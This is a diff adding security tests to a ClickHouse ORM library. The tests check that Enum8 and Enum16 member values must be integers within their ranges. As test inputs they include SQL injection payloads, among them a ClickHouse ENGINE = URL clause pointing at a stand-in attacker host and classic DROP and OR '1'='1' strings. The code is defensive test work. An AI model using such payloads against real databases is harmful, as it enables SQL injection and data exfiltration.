@@ -116,6 +116,54 @@ describe("ck-orm sql security", function describeSqlSecurity() {
     expect(col.sqlType).toBe("Enum16('paused\\'; DROP' = 100)");
   });
 
+  it("rejects non-number enum member values instead of splicing them into sqlType", function testEnumMemberValueType() {
+    const injected = "1)) ENGINE = URL('http://attacker.example/') --";
+    expect(() => enum8({ ok: injected as never })).toThrow('Enum8 member "ok" must be an integer between -128 and 127');
+    expect(() => enum16({ ok: [injected] as never })).toThrow(
+      'Enum16 member "ok" must be an integer between -32768 and 32767',
+    );
+    // `valueOf` returns a valid number, so any coercion would let `toString` reach the SQL.
+    expect(() =>
+      enum8({
+        ok: {
+          toString() {
+            return injected;
+          },
+          valueOf() {
+            return 1;
+          },
+        } as never,
+      }),
+    ).toThrow('Enum8 member "ok" must be an integer between -128 and 127');
+    expect(() => enum8({ ok: "1" as never })).toThrow('Enum8 member "ok" must be an integer between -128 and 127');
+  });
+
+  it("rejects non-integer enum member values", function testEnumMemberValueInteger() {
+    expect(() => enum8({ ok: 1.5 })).toThrow('Enum8 member "ok" must be an integer between -128 and 127, got 1.5');
+    expect(() => enum8({ ok: Number.NaN })).toThrow(
+      'Enum8 member "ok" must be an integer between -128 and 127, got NaN',
+    );
+    expect(() => enum16({ ok: Number.POSITIVE_INFINITY })).toThrow(
+      'Enum16 member "ok" must be an integer between -32768 and 32767, got Infinity',
+    );
+  });
+
+  it("accepts enum8 member values only inside the Int8 range", function testEnum8MemberValueRange() {
+    expect(enum8({ low: -128, high: 127 }).sqlType).toBe("Enum8('low' = -128, 'high' = 127)");
+    expect(() => enum8({ high: 128 })).toThrow('Enum8 member "high" must be an integer between -128 and 127, got 128');
+    expect(() => enum8({ low: -129 })).toThrow('Enum8 member "low" must be an integer between -128 and 127, got -129');
+  });
+
+  it("accepts enum16 member values only inside the Int16 range", function testEnum16MemberValueRange() {
+    expect(enum16({ low: -32768, high: 32767 }).sqlType).toBe("Enum16('low' = -32768, 'high' = 32767)");
+    expect(() => enum16({ high: 32768 })).toThrow(
+      'Enum16 member "high" must be an integer between -32768 and 32767, got 32768',
+    );
+    expect(() => enum16({ low: -32769 })).toThrow(
+      'Enum16 member "low" must be an integer between -32768 and 32767, got -32769',
+    );
+  });
+
   it("escapes dateTime64 timezone with single quotes", function testDateTime64TimezoneEscaping() {
     const col = dateTime64({ precision: 3, timezone: "Asia/Shanghai' OR '1'='1" });
     expect(col.sqlType).toBe("DateTime64(3, 'Asia/Shanghai\\' OR \\'1\\'=\\'1')");
